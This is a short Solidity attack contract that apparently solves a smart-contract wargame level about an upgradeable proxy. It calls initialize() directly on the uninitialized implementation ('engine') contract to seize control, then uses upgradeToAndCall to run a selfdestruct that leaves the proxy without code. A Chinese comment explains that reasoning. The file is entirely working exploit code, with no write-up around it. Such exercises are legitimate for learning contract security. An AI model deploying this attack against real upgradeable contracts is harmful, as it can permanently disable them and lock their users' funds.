// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface IEngine{
  function initialize() external;
  function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

contract MotorbikeRun{

  function run(address _engineAddress) external payable {   
    //impl也是个真实的合约，也可以调用方法，只是用的是自己的storage,如果把impl给摧毁，会导致proxy没有地方执行代码 
    IEngine(_engineAddress).initialize();
    IEngine(_engineAddress).upgradeToAndCall(address(this), abi.encodeWithSignature("destory()"));
  } 

  function destory() external {
    selfdestruct(payable(address(this)));
  }

}